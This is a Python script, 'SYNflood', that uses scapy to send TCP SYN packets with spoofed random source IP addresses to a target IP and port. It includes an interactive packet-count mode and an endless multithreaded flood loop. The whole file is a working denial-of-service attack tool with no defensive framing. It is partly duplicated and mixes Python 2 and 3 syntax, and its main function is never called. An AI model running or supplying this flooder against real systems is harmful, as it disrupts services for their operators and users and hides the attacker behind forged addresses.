#!/usr/bin/env python
#########################################
#
# SYNflood - A multithreaded SYN Flooder
# author: arthurnn
#
#
#########################################
import socket, random, sys, threading
from scapy.all import *
import os
import sys
import random

#makes a random ip
def randomIP():
	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
	return ip

def randInt():
	x = random.randint(1000,9000)
	return x

#consturcts a custum data packet with ramdom vaules
#then send the packet to target
def SYN_Flood(dstIP,dstPort,counter):
	total = 0

	for x in range (0,counter):
		s_port = randInt()
		s_eq = randInt()
		w_indow = randInt()

		IP_Packet = IP ()
		IP_Packet.src = randomIP()
		IP_Packet.dst = dstIP

		TCP_Packet = TCP ()
		TCP_Packet.sport = s_port
		TCP_Packet.dport = dstPort
		TCP_Packet.flags = "S"
		TCP_Packet.seq = s_eq
		TCP_Packet.window = w_indow

		send(IP_Packet/TCP_Packet, verbose=0)
		total+=1
	sys.stdout.write("\nTotal packets sent: %i\n" % total)


def info():
	os.system("clear")


	dstIP = input("\nTarget IP : ")
	dstPort = input ("Target Port : ")

	return dstIP,int(dstPort)

#control of code
def main():
	dstIP,dstPort = info()
	counter = input ("How many packets do you want to send : ")
	SYN_Flood(dstIP,dstPort,int(counter))

if len(sys.argv) != 3:
	print "Usage: %s <Target IP> <Port>" % sys.argv[0]
	sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])

total = 0
conf.iface='en1';#network card XD

class sendSYN(threading.Thread):
	global target, port
	def __init__(self):
		threading.Thread.__init__(self)
	def run(self):
		i = IP()
		i.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
		i.dst = target

		t = TCP()
		t.sport = random.randint(1,65535)
		t.dport = port
		t.flags = 'S'

		send(i/t, verbose=0)

print "Flooding %s:%i with SYN packets." % (target, port)
while 1:
	sendSYN().start()
	total += 1
	sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
